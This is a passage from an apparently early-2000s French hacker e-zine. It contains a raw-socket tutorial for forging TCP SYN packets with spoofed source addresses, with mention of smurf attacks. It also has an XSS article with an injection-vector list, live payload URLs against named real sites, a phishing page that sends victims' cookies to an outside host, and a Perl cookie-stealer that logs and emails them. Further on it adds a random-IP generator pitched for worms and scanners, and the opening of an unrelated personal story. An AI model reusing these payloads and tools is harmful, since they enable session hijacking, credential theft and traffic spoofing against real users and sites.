	ipHeader.ip_ttl		= 128;		// Time to live (en hops) gΘnΘralement 128
						// parfois 48, dependant de vos besoins
	ipHeader.ip_verlen	= (4 << 4) | iIPSize; 	// iIPSize = sizeof(ipHeader) / sizeof(unsigned long);

	ipHeader.ip_destaddr	= inet_addr("127.0.0.1");	// addresse de destination
	ipHeader.ip_srcaddr	= inet_addr("7.7.7.7");	// source

Avec des noms de variables aussi clairs que τa, je ne  crois
pas avoir besoin d'expliquer chaque chose ;). J'ai pris soin
de  mettre  les  variables  en  commentaire  o∙  elles  sont
utilisΘes,  pour  avoir  une  idΘe  de  ce  que  vous faites
vraiment. Maintenant allons y pour le TCP.

Un des avantages des raw  sockets, est que vous pouvez  vous
mΩme choisir  la provenance  du packet.  C'est α  dire qu'en
changeant  le  IP_HDR.ip_srcaddr  pour un  autre  ip  que le
v⌠tre, (7.7.7.7 dans ce cas-ci), la personne qui va recevoir
le packet  pensera qu'il  viens de  ce ip.  C'est d'ailleurs
comme τa que les smurfs marchent. Ils envoient un ping α une
liste de serveurs, les  serveurs, eux, vont tous  rΘpondre α
la "victime" en mΩme temps ce qui va causer sa dΘconnection,
tout dΘpendant de plusieurs facteurs. Assez parlΘ de  smurf,
et continuons avec le TCP.

	TCP_HDR tcpHeader;

	tcpHeader.acknum	= 0;
	tcpHeader.DataOffset	= (5) << 4;
	tcpHeader.Flags		= SYN;
	tcpHeader.seqnum	= htonl(7777); // n'importe quoi
	tcpHeader.Windows	= htons(7777); // n'importe quoi
	tcpHeader.Checksum	= 0;
	tcpHeader.UrgPointer	= 0;
	tcpHeader.sport		= htons(7777); // le port source,
						// ce que vous voulez ;)
	tcpHeader.dport		= htons(80);   // le port de la destination

C'est assez simple ici aussi, je ne pense pas que  quelqu'un
ne comprenne pas quelque chose. Lors d'une connexion TCP/IP,
l'h⌠te  gΘnΦre  un "numΘro  de  sΘquence initiale"  (Initial
sequence number (ISN)). Ce numΘro est utilisΘ pour garder la
trace sur les  paquets envoyΘs et  pour Ωtre certain  que la
connexion continue bel et  bien. Dans notre situation,  avec
des sockets  raw, on  ne se  sert pas  vraiment de  τa, vous
pouvez donc marquer ce que vous voulez α "tcpHeader.seqnum".
De mΩme pour "tcpHeader.Windows".

Maintenant, on va avoir besoin d'un pseudo-header pour faire
le checksum  de notre  header TCP.  C'est trΦs  semblable au
TCP_HDR en fait, voici comment on procΦde:

	PS_HDR psHeader;

	psHeader.placeholder	= 0;
	psHeader.protocol	= IPPROTO_TCP;
	psHeader.tcp_length	= htons(sizeof(tcpHeader));
	psHeader.source_address	= inet_addr("7.7.7.7"); //comme dans le IP_HDR
	psHeader.dest_address	= inet_addr("127.0.0.1");//mΩme chose ici aussi
	memcpy(&psHeader.tcp, &tcpHeader, sizeof(tcpHeader));

Voilα, on a crΘΘ  notre pseudo header et  pouvons maintenant
procΘder au checksum :

	tcpHeader.Checksum	= checksum((usigned short *)&psHeader, sizeof(psHeader));

Ceci conclus le chapitre.

ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐
⌐                   EXAMPLE DE CODE                        ⌐
ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐

/************************************************************/
#include &lt;winsock2.h>
#include &lt;ws2tcpip.h>
#include &lt;stdio.h>
#include &lt;stdlib.h>
#include "tcpip.h"
#pragma comment(lib, "ws2_32.lib")

int CreatePacket(int, int, int, char[]);
int SendPacket(int, int, int);

int main()
{
    int destPort		= 80;				// le port de destination
    int destIP			= inet_addr("127.0.0.1");	// Addresse de destination
    int srcIP			= inet_addr("19.13.2.7");	// Provenance (ce que vous voulez)

	// envoi de 5 packets
	for(int a = 0; a < 5; a++)
		SendPacket(destPort, destIP, srcIP);

	return 0;
}

int CreatePacket(int dport, int destIP, int srcIP, char buf[])
{
	// DΘclaration des headers TCP IP et Pseudo header
    	IP_HDR			ipHeader;
	TCP_HDR			tcpHeader;
	PS_HDR			psHeader;
    	int			iSize,		// Grosseur totale du packet ( + sizeof(autre_buffer) )
				iIPVersion,	// La version, dans notre cas IPv4
				iIPSize;	// La grosseur du IP
    	char			*cPtr = NULL;


    	iSize = sizeof(ipHeader) + sizeof(tcpHeader);
    	iIPVersion = 4;
    	iIPSize = sizeof(ipHeader) / sizeof(int);

	// Configuration des headers
	// Header IP
	ipHeader.ip_checksum		= 0;
	ipHeader.ip_id			= 1;
	ipHeader.ip_offset		= 0;
	ipHeader.ip_protocol		= IPPROTO_TCP;
	ipHeader.ip_tos			= 0;
	ipHeader.ip_totallength		= htons(iSize);
	ipHeader.ip_ttl			= 128;
	ipHeader.ip_verlen		= (4 << 4) | iIPSize;

	ipHeader.ip_destaddr		= destIP;		// addresse de destination
	ipHeader.ip_srcaddr		= srcIP;		// source

	// Header TCP
	tcpHeader.acknum		= 0;
	tcpHeader.DataOffset		= (5) << 4;
	tcpHeader.Flags			= SYN;
	tcpHeader.seqnum		= htonl(7777);
	tcpHeader.Windows		= htons(7777);
	tcpHeader.Checksum		= 0;
	tcpHeader.UrgPointer		= 0;
	tcpHeader.dport			= htons(80);	// destination
	tcpHeader.sport			= htons(7777);	// source

	// Pseudo Header
	psHeader.placeholder		= 0;
	psHeader.protocol		= IPPROTO_TCP;
	psHeader.tcp_length		= htons(sizeof(tcpHeader));
	memcpy(&psHeader.tcp,&tcpHeader, sizeof(tcpHeader));
	psHeader.dest_address		= destIP;	// destination
	psHeader.source_address		= srcIP;	// source

	// Calcul du checksum
	tcpHeader.Checksum 		= checksum((USHORT *)&psHeader, sizeof(psHeader));

	// PrΘparation du buffer
	memset(buf, 0, sizeof(buf));
	cPtr = buf;
	memcpy(cPtr, &ipHeader, sizeof(ipHeader));
	cPtr = cPtr + sizeof(ipHeader);
	memcpy(cPtr, &tcpHeader, sizeof(tcpHeader));
	cPtr = cPtr + sizeof(tcpHeader);

	return 0;
}

int SendPacket(int destPort, int destIP, int srcIP)
{
	WSADATA		WSAData;
	SOCKET		sock;
	BOOL		bOpt =true;
   	struct		sockaddr_in sin;
   	char		buf[40];

    	WSAStartup(MAKEWORD(2,2), &WSAData);

	sock = WSASocket(AF_INET, SOCK_RAW, IPPROTO_RAW, NULL, 0,0);

    	setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *)&bOpt, sizeof(bOpt));
    	sin.sin_family = AF_INET;
    	sin.sin_port = htons(1);
    	sin.sin_addr.s_addr = destIP;

	// Envoi de 1 packet
	CreatePacket(destPort,destIP,srcIP, buf);
	sendto(sock, buf, sizeof(buf), 0, (SOCKADDR *)&sin, sizeof(sin));

	// Cleaning up...
    	closesocket(sock);
    	WSACleanup();
    	return 0;
}

/************************************************************/


ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐
⌐                   HEADER └ UTILISER                      ⌐
ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐

J'ai trouvΘ ce petit header dΘjα programmΘ par "ziss".  J'en
ai vu beaucoup d'autres, mais j'ai trouvΘ que celui-ci Θtait
le mieux  construit avec  des noms  de variables appropriΘs.
J'ai donc choisi de l'inclure dans cet article.

/*************************** TCPIP.H ********************************/
/************************** by:  ziss *******************************/
#ifndef _TCPIP_H_
#define _TCPIP_H_

// Standard TCP flags
#define URG 0x20
#define ACK 0x10
#define PSH 0x08
#define RST 0x04
#define SYN 0x02
#define FIN 0x01

// Our tcp header struct
typedef struct tcp_hdr
	{
	unsigned short	sport;
	unsigned short	dport;
	unsigned int	seqnum;
	unsigned int	acknum;
	unsigned char	DataOffset;
	unsigned char	Flags;
	unsigned short	Windows;
	unsigned short	Checksum;
	unsigned short	UrgPointer;
	}TCP_HDR;

// Our ip header struct
typedef struct ip_hdr
{
    unsigned char  ip_verlen;        // IP version & length
    unsigned char  ip_tos;           // IP type of service
    unsigned short ip_totallength;   // Total length
    unsigned short ip_id;            // Unique identifier
    unsigned short ip_offset;        // Fragment offset field
    unsigned char  ip_ttl;           // Time to live
    unsigned char  ip_protocol;      // Protocol(TCP, UDP, etc.)
    unsigned short ip_checksum;      // IP checksum
    unsigned int   ip_srcaddr;       // Source address
    unsigned int   ip_destaddr;      // Destination address

} IP_HDR;

// Our pseudo header struct
typedef struct ps_hdr
   {
      unsigned int source_address;
      unsigned int dest_address;
      unsigned char placeholder;
      unsigned char protocol;
      unsigned short tcp_length;
      struct tcp_hdr tcp;
   }PS_HDR;

// Standard TCP/UDP checksum function.
USHORT checksum(USHORT *buffer, int size)
{
    unsigned long cksum=0;
    while (size > 1)
    {
        cksum += *buffer++;
        size  -= sizeof(USHORT);
    }
    if (size)
    {
        cksum += *(UCHAR*)buffer;
    }
    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >>16);
    return (USHORT)(~cksum);
}
#endif

/********************** END TCPIP.H *************************************/

ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐
⌐                      CONCLUSION                          ⌐
ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐

Il  y a  beaucoup α  faire avec  les raw  sockets.  Je  vous
suggΦre fortement  de lire  plus sur  le sujet  si vous Ωtes
intΘressΘ. Les possibilitΘs  sont infinies, mais  ceci n'est
que  la poignΘe  de la  porte. J'espΦre  toutefois que  vous
aurez appris un peu, ceci  conclus ce court article sur  les
raw sockets 2k/XP.

ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐



            ___                                                           ___
     .----/   /----------- ---------- --------- - -- - - --- -----------/   /
     |   /   /                                                         /   /|
     :  /   /                                                         /   / :
     | /   /                 alice514@hotmail.com                    /   /  |
     |/   /                                                         /   /   | 
     /___/-- ---------- -----  ----------------- - ------- -- --- -/___/----'



   < Mindkind tales from IRC >
   < WARNING : TOO MUCH IRC CAN AFFECT YOUR SEXUAL LIFE (if you have one >

   [13:07] &lt;BoiSS> LastCall_: garde ste boutte la pour le prochain e-zine :P
   [13:07] &lt;BoiSS> &lt;LastCall_> sΘrieux les gars c plus le fun se hacker nous meme
   [13:08] &lt;BoiSS> &lt;LastCall_> ahha
   [13:08] &lt;BoiSS> &lt;LastCall_> jvois plus de but
   [13:08] &lt;BoiSS> &lt;LastCall_> hehe
   [13:08] &lt;BoiSS> &lt;MindFlayR> hahaha
   [13:08] &lt;BoiSS> &lt;LastCall_> c comme se masturber genre
   [13:08] &lt;BoiSS> &lt;LastCall_> cΘ pas dangeureux
   [13:08] &lt;BoiSS> &lt;LastCall_> pis c le fun pareil
   [13:08] &lt;BoiSS> &lt;LastCall_> haha
   [13:08] &lt;BoiSS> &lt;LastCall_> surement qua longue on se tanne..
   [13:08] &lt;LastCall_> haha
  
   < ----------------------- >

                                                        __ ______
            __    __  __  _ ___   __       _  _   _   _\_ _  _   \
           /  \  /  \ \ \ \  _ \ \ .\     | |/ / / / / _  / /.\   \
     .- - / /\ \/ /\ \-\_\ \_\\_\-\_/ ----|   < /_/-/_//_/\/__/    \-  ------. 
     :    \ \ \__/ / /                    |_|\_\           \        \        : 
     ,     \/      \/                                       \        \       |
     :                                                       \        \      .
     . 11.11    Cross-Site Scripting, gimme a cookie          \        \     !
     .             aka                                         \        \    .
     ;             cookie-stealing, it's EVIL                   \        \   :
     :                                                           \        \  :
     '-- -----  - -------- --- --------- - --  ------------- --- -\        \-'
                                                                   \____ _ _\


C'est quoi le cross site scripting ?
------------------------------------

Bin, c'est une attaque qui consiste α faire exΘcuter des choses mΘchantes a une
application web pour voler des informations sur les utilisateurs. Par  exemple,
un hyper lien (merde l'Office de  la langue franτaise doit Ωtre fier,  un terme
francophone dans Mindkind) qui contient des instructions autres que celles  que
l'utilisateur voit. (hen!, j'comprends pas pas). Humm ok peut-Ωtre qu'avec  des
exemples τa va mieux  aller. On peut faire  des attaques XSS (l'abrΘviation  de
cross site scripting) en javascript, activeX, vbscript, flash et mΩme html.  On
les utilises souvent pour voler  des cookies aux utilisateurs, mais  aussi pour
spoofer (la  l'Office de  la langue  franτaise m'emmerde  j'crois) une attaque,
faire du DoS (si si c'est  possible avec un peu d'imagination), etc.  Aussi, il
ne faut pas absolument cliquer sur  un lien pour Ωtre vulnΘrable α  une attaque
XSS,  il  est  possible de  faire  exΘcuter  le code  dans  un  html e-mail  ou
directement en visitant une page web. 

A l'attaque moussaillon
-----------------------
Bon, premiΦrement, il faut trouver une  faille XSS. Une mΘthode simple pour  en
dΘcouvrir est de remplacer n'importe quel donnΘes en user input par 
&lt;script>alert(document.cookie);&lt;/script>
Les meilleurs endroits pour chercher des failles XSS sont les CGI scripts,  les
engins de recherche, les forums interactifs, les pages d'erreurs personnalisΘes
etc... Voila des exemples d'endroits ou  vous pouvez insΘrer le evil code  dans
le code normal. 

XSS common injection
--------------------
&lt;a href="javas&#99;ript&#35;[code]">
&lt;div onmouseover="[code]">
&lt;img src="javascript:[code]">
&lt;img dynsrc="javascript:[code]"> [IE]
&lt;input type="image" dynsrc="javascript:[code]"> [IE]
&lt;bgsound src="javascript:[code]"> [IE]
&lt;script>[code]&lt;/script>
&{[code]}; [N4]
&lt;img src=&{[code]};> [N4]
&lt;link rel="stylesheet" href="javascript:[code]">
&lt;iframe src="vbscript:[code]"> [IE]
&lt;img src="mocha:[code]"> [N4]
&lt;img src="livescript:[code]"> [N4]
&lt;a href="about:&lt;s&#99;ript>[code]&lt;/script>">
&lt;meta http-equiv="refresh" content="0;url=javascript:[code]">
&lt;body onload="[code]">
&lt;div style="background-image: url(javascript:[code]);">
&lt;div style="behaviour: url([link to code]);"> [IE]
&lt;div style="binding: url([link to code]);"> [Mozilla]
&lt;div style="width: expression([code]);"> [IE]
&lt;style type="text/javascript">[code]&lt;/style> [N4]
&lt;object classid="clsid:..." codebase="javascript:[code]"> [IE]
&lt;style><!--&lt;/style>&lt;script>[code]//-->&lt;/script>
<![CDATA[<!--]]>&lt;script>[code]//-->&lt;/script>
<!-- -- -->&lt;script>[code]&lt;/script))<!-- -- -->
<&lt;script>[code]&lt;/script>
&lt;img src="blah"onmouseover="[code]">
&lt;img src="blah>" onmouseover="[code]">
&lt;xml src="javascript:[code]">
&lt;xml id="X">&lt;a>&lt;b>&lt;script>[code]&lt;/script>;&lt;/b>&lt;/a>&lt;/xml>
&lt;div datafld="b" dataformatas="html" datasrc="#X">&lt;/div>
[\xC0][\xBC]script>[code][\xC0][\xBC]/script> [UTF-8; IE, Opera]

Comme chez Mindkind  on est pas  cheap, on va  vous faire un  exemple rΘel mais
inutile  de  cookie stealing  α  l'aide d'une  attaque  XSS. Vu  qu'on  est des
comiques on a ciblΘ www.toile.qc.ca en hommage α Pierre-Karl PΘladeau (osti  de
cave) 

Tiens l'engin de recherche est vulnΘrable
URL preuve:

http://recherche.toile.qc.ca/cgi-bin/recherche?ou=T&q=&categorie=&ad=w5n2&client=
netgraphe&ie=latin1&oe=latin1&output=xml_no_dtd&ip=205.237.234.78&userid=netgraphe
&userip=205.237.234.78&start=0&num=20&lr=&query=%3Cscript%3Ealert%28
document.cookie%29%3B%3C%2Fscript%3E&x=24&y=7

Bon si vous avez visitΘ www.toile.qc.ca le cookie va contenir de quoi (sinon il
n'apparaεtra rien parce qu'il va Ωtre vide)
Dans mon cas τa la donnΘ un cookie contenant xs=2 (joie)
Bon on va voler les cookies des autres users.
Il faut procΘder en 5 Θtapes :
1- Trouver une application  vulnΘrable au XSS qui  possΦde une forme de  login.
(si on veux voler quelque chose d'intΘressant mais c'est pas notre cas, on  est
des thΘoriciens, pas des criminels)
C'est fait.
2- Envoyer une requΩte visant α voler le cookie d'un utilisateur de la toile du
QuΘbec α l'utilisateur en question.  On peux utiliser le social  engineering ou
peu importe, tant qui  exΘcute le code dans  son browser. Pour l'exemple  on va
faire une page web bidon 

Code source de la page web:
&lt;html>
&lt;head>
&lt;title>MindFlayR evil cookie stealing page&lt;/title>
&lt;/head>
&lt;body>
&lt;a href="http://recherche.toile.qc.ca/cgi-bin/recherche?page=1&lang=fr&operator=and&categorie=
&tronquer=&query=%3Cscript%3Edocument.location.replace%28%27http%3A%2F%2Fmindflayrwebsite.com
%2Fsteal.cgi%3F%27%2Bdocument.cookie%29%3B%3C%2Fscript%3E&x=12&y=15">
I will stole your cookie when you will click here 
&lt;/a>
&lt;/body>
&lt;/html>

Comme  vous  pouvez peut-Ωtre  le  remarquer, la  requΩte  prend le  cookie  de
l'utilisateur qui click sur le lien et l'envoie α
                                          http://mindflayrwebsite.com/steal.cgi

Pour rendre l'attaque  encore plus subtile  il est possible  de cacher la  vrai
destination du lien avec un simple code 
onMouseOver="window.status='http://www.legentilsitedeloncletom.com';return true"
onMouseOut="window.status='';return true">Visiter le gentil site de l'oncle Tom!
Il faut bien s√r insΘrer ce code α la place du texte "I will stole your  cookie
when you will click here " du premier code. 

3- Quand l'utilisateur  click sur le  lien souhait visiter  le site de  ce cher
oncle   Tom,   le   cookie   est   envoyΘ   sur   le   script   steal.cgi    de
mindflayrwebsite.com. 

4- Le script steal.cgi enregistre le cookie
Comme je suis trop  lΓche pour coder un  cookie stealer moi mΩme  j'ai empruntΘ
celui de David Endler de idefense (en fait c'est pas que je suis lΓche mais  je
manque de  temps Θcrivant  mon article  a derniΦre  minute comme d'habitude) 
[ Note de Last : t pas si pire MindFlou, ya du monde qui on  Θcrit leur article
aprΦs la derniΦre minute ;-) ]

------cookie stealer code-----
#!/usr/bin/perl
# steal.cgi by David Endler dendler@idefense.com
# Specific to your system
$mailprog = '/usr/sbin/sendmail';
# create a log file of cookies, we'll also email them too
open(COOKIES,">>stolen_cookie_file");
# what the victim sees, customize as needed
print "Content-type:text/html\n\n";
print <&lt;EndOfHTML;
&lt;html>&lt;head>&lt;title>Cookie Stealing&lt;/title>&lt;/head>
&lt;body>
Your Cookie has been stolen. Thank you.
&lt;/body>&lt;/html>
EndOfHTML
# The QUERY_STRING environment variable should be filled with
# the cookie text after steal.cgi:
# http://www.attacker.com/steal.cgi?XXXXX
print COOKIES "$ENV{'QUERY_STRING'} from $ENV{`REMOTE_ADDR'}\n";

# now email the alert as well so we can start to hijack

open(MAIL,"|$mailprog -t");
print MAIL "To: attacker\@attacker.com\n";
print MAIL "From: cookie_steal\@attacker.com\n";
print MAIL "Subject: Stolen Cookie Submission\n\n";
print MAIL "-" x 75 . "\n\n";
print MAIL "$ENV{'QUERY_STRING'} from $ENV{`REMOTE_ADDR'}\n";
close (MAIL);

------end of code--------

5- Aller voir ses emails et rΘcupΘrer le cookie fraεchement volΘ!

xss vuln too: 
http://www.ulaval.ca/adul/rechercher.html
http://www.francite.com
http://www.normos.org/fr/textSearch.html
http://www.sierraflower.com/sff/search_fr.asp?NC=1&VarID=0&S_Param1=&L=2333318476235
http://www.emergis.com/fr/other/help/results.asp?Scope=all&q1=%3Cscript%3Ealert%28%27Mindkind+owned+your+ass%27%29%3B%3C%2Fscript%3E
http://www.montrealdvd.com/search.asp
http://search.canoe.ca/canoe/?lr=canoesearch&q=%3Cscript%3Ealert%28%27Mindkind+owned+your+ass%27%29%3B%3C%2Fscript%3E&ad=w5n2&client=netgraphe&ie=latin1&oe=latin1&output=xml_no_dtd&ip=205.237.234.78&userid=netgraphe&userip=205.237.234.78&start=0&num=20&adtest=off&x=12&y=7


Bon j'ai dΘcidΘ d'aviser les  admins des problΦmes de cross-site  scripting sur
leur site question de voir leur rΘaction.

Mon e-mail (envoyΘ vers le 1 dΘcembre 2002)
----------
Bonjour, je vous Θcris pour vous  aviser d'un problΦme de sΘcuritΘ sur  (le nom
du  site)  (en  fait  l'engin  de  recherche).  Il  suffit  d'injecter  du code
javascript  dans  la  boite  de requΩte  pour  le  faire  exΘcuter. (cross-site
scripting vulnerability)

&lt;script>alert('Voila le probleme de sΘcuritΘ');&lt;/script>
par exemple...

Voici quelques liens pour vous aider a rΘgler le problΦme et sur cette sorte de
vulnΘrabilitΘ :
http://www.cgisecurity.com/articles/xss-faq.shtml
http://www.cert.org/archive/pdf/cross_site_scripting.pdf
http://www.idefense.com/XSS.html
J'espΦre que ceci  pourra vous aider  et j'espΦre avoir  des nouvelles de  vous
trΦs bient⌠t.

MindFlayR
mindflayr@mindkind.org
http://www.mindkind.org:8787/

Reponse (en date du 9 dΘcembre 2002)
-------

admin@toile.com
---------------
Patch: Non
Reponse: Non

adul@adul.ulaval.ca
-------------------
Patch: Non
Reponse: Non

commentaires@francite.com
-------------------------
Patch: Oui
Reponse: Non

info@normos.org
---------------
Patch: Non
Reponse:Non

solutions@emergis.com
---------------------
Patch: Non
Reponse: Non

info@montrealdvd.com
--------------------
Patch: Non
Reponse: Non
Note:  montrealdvd.com semble  utiliser  une  vieille version  de Snitz  Forums
2000. La vulnΘrabilitΘ de l'engin de  recherche n'apparaεt pas nul part sur  le
web (aprΦs de courtes recherches) mais le problΦme semble rΘglΘ sur le site  de
Snitz (http://forum.snitz.com/).

Comme vous pouvez l'observer, seul francite a patchΘ son engin de recherche  ce
qui semble dΘmontrer que tout le  monde se fout complΦtement de la  sΘcuritΘ au
quΘbec.

En guise de conclusion, j'espΦre que vous avez comprit maintenant la menace que
reprΘsente les failles XSS et que vous  avez une bonne idΘe de la faτon  de les
exploiter (et donc de patcher vos codes pour Θviter cela). Je vous reviens dans
le prochain Mindkind avec quelques trucs croustillants.


            ___                                                           ___
     .----/   /----------- ---------- --------- - -- - - --- -----------/   /
     |   /   /                                                         /   /|
     :  /   /                                                         /   / :
     | /   /                mindflayr@mindkind.org                   /   /  |
     |/   /                                                         /   /   | 
     /___/-- ---------- -----  ----------------- - ------- -- --- -/___/----'






        ____         ,-------------------------------------------------
       /    \        |
      |  _   |       | Mindkind's handy code #467
      | / \  |       | 
      ||   | |      /  Vous avez besoin de gΘnΘrer une liste d'IPs random
      (.) (.)|     /   pour X projet (worm, scanner, peu importe) et vous
      ||   | |    <__  Ωtes trop lΓche pour le coder vous-mΩme ?
      ||   | | |     | Mindkind a une solution cheap et facile pour vous.
      ||   | | |     |
      |____/|| |     | /*
      |\___/ | |     | Random Ip Generator by [Funky] of mindkind.org
      ||   | | |     | inspired by an original code of ADM and an 
      ||   | | |     | idea of MindFlayR
      ||   | | |     | put 500 random ip (not always really used ip) in result.log
      ||     | |       in result.log
      | \___/  |       */
      |        |       #include &lt;stdio.h> 
       \______/        #include &lt;time.h>
		       #include &lt;stdlib.h>

			int myrand(){
			   int j;
			   j=1+(int) (230.0*rand()/(RAND_MAX+1.0));
			   return(j);
			}

			void main(){
			   int i, a;
			   int FiLe = fopen("result.log", "wa");

			   for(a = 0; a < 500; a++){ /* you can change the number of generated ip here */
			      srand((time(NULL)*rand()));
			      for (i = 0; i < 3; i++)
			         fprintf(FiLe, "%i.",myrand());

			      fprintf(FiLe, "%i\n",myrand());
			   }
			}





                                                        __ ______
            __    __  __  _ ___   __       _  _   _   _\_ _  _   \
           /  \  /  \ \ \ \  _ \ \ .\     | |/ / / / / _  / /.\   \
     .- - / /\ \/ /\ \-\_\ \_\\_\-\_/ ----|   < /_/-/_//_/\/__/    \-  ------. 
     :    \ \ \__/ / /                    |_|\_\           \        \        : 
     ,     \/      \/                                       \        \       |
     :                                                       \        \      .
     . 11.12   Useless meeting                                \        \     !
     .             aka                                         \        \    .
     ;     This isn't que square root of 0                      \        \   :
     :                                                           \        \  :
     '-- -----  - -------- --- --------- - --  ------------- --- -\        \-'
                                                                   \____ _ _\
                                                     

T'as quel age ?  Je lui est rΘpondu  18, mais que rΘflexion   faite, τa n'avait
pas rΘellement d'importance. Il ma demandΘ  pourquoi je lui est dit τa,  je lui
est dis que mon corps va vieillir,  mΩme si je perds toute notion du temps.  Je
me  suis assis,   il Θtait   α cotΘ  de moi.  Pourquoi cette  personne  peut-il
m'aider  ?  C'est   sur, il  avait mit  tout ses  dipl⌠mes   reprΘsentant   ses
exploits  pseudo- intellectuels sur le mur,  mais  bon, j'aurais  s√rement   pu
faire pareil avec un peu de volontΘ,  et  je  ne suis quand mΩme pas en  mesure
de m'aider  moi-mΩme.  J'avais   le go√t  d'une cigarette,  mais j'imaginais un
logo interdisant de  fumer  sur  le mur rouge foncΘ  de la piΦce; non,  il n'en
avait pas. Ce n'est qu'une fois allumΘe qu'il ma demandΘ de ne pas fumer, comme
s'il s'imaginait que j'allais  porter  une cigarette  qui n'est pas allumer sur
le  rebord de  mes lΦvre   pendant  10  minutes.  Je  n'ai pas  trop saisi  son
raisonnement, et je crois qu'il a pu le lire dans  mon regard, car il ma  tendu
un cendrier vide,  comme  si j'Θtais le  premier  a fumer en sa  compagnie.  Je
lui  est   demandΘ  pourquoi   il  est  propriΘtaire d'un  cendrier,  s'il  est
interdit de fumer. Il ma rΘpondu  que certain patient avaient un grand   besoin
de nicotine, et qu'il Θtait en mesure de faire  quelques  compromis.   J'aurais
eu le  go√t de  lui dire  que ce   n'Θtait  pas   mon  cas,  mais  s'il prΘfΦre
faire des  conclusions  rapides,   c'est  son   choix.  Tout  compte fait,   je
n'Θtais pas venu   ici pour parler  et penser aux  cigarettes, je me  suis donc
permit de lui demander de  commencer la rencontre.  Comme s'il  s'attendait que
je lui demande exactement  τa, il s'est mit  a Θcrire sur une  feuille blanche,
non-lignΘe. Il α  s√rement Θcrit mon  nom et mon  age,  les  2   seules  choses
qu'il savait sur moi, α l'instant prΘsent.  Mais il continuait d'Θcrire, et  me
posant des questions, sans mΩme me regarder :  "tu  as fini l'Θcole ?"  Je  lui
expliquΘ  que  en  principe oui,   mais qu'en thΘorie, non. "pourquoi  ?" parce
que j'ai lΓchΘ  avant d'avoir fini au complet mon secondaire, mais que  j'avais
assΘ de crΘdits pour graduer. Il n'a pas sembler satisfait de ma rΘponse.  S'il
l'aurait ΘtΘ,   il  ne   m'aurait  s√rement  pas demander  pourquoi j'ai  lΓchΘ
avant le temps. ╟a ma  un peu fΓchΘ, et je  lui  est  dit  que  je  n'Θtais pas
venu ici pour parler  de   mon  Θcole,  mais  de  moi.  Il a lever la tΩte,  un
peu trop rapidement  α mon go√t,  et m'a fait  remarquer qu'un humain  passe en
majoritΘ une grande partie de sa vie α Θtudier, et que cela fait parti de  lui.
J'aurais bien aimΘ le contredire, mais ce  qu'il disait n'Θtait pas  totalement
faux,  j'ai  donc  approuvΘ,   pour  ensuite   lui    donner   un   regarde  de
quelqu'un qui semble  intΘresser α sa  prochaine question. Au  fait, je n'Θtais
pas intΘresser. Mais j'ai fini par me dire qu'il valait mieux le laisser  faire
sa   job, comme  τa je  s'aurai sortie  d'ici assez  rapidement. Pendant  le  2
minutes qu'il prenait  α Θcrire ce  que je lui  avait dit,  je   prΘparais  les
rΘponses aux  questions potentielles  dans ma  tΩte. Mais  il Θtait loin d'Ωtre
pathΘtique, ou conformiste dans ses  questions. ╟a,  je  l'ai  remarquΘ   α  sa
2ieme question, lorsqu'il ma  demandΘ   clairement  si  je s'avais que  j'Θtais
dΘprimΘ. C'est  la   question  la  plus   stupide  que j'avais  jamais entendu,
mais  c'Θtais  une  des  celles  que  je n'avais pas eu la chance d'y  rΘpondre
intΘrieurement.   J'ai  tentΘ de  lui  expliquer que  je  passais une   pΘriode
sombre,  mais  qu'en normalitΘ, je  n'Θtais  pas aussi bas. Ensuite on a  parlΘ
de tout et de rien, il ma mΩme   demandΘ se que je faisais de mes journΘes.  Je
lui est rΘpondu  que je lisais,  j'Θcrivais, et  que   j'essayais de dormir  le
plus tard possible, que  rendu au  soir  s'il   faisait beau, j'allais au  Tim;
sinon, je m'enfermais dans  ma chambre.  Le facteur  a prendre en note  est  sa
rΘaction  qu'il  a  eut quand  il  a  saisi que  je  n'avais   aucuns  rapports
sociaux.   Il  a   semblΘ surpris,   et τa  ma surpris  moi aussi  de  le  voir
surpris.   Vers la  fin de  ma rencontre,    il   ma   fiΦrement  affirmΘ   que
j'Θtais dΘprimΘ. Il m'a ensuite  prescrit 4 anti-dΘpresseurs,  m'a  demandΘ  de
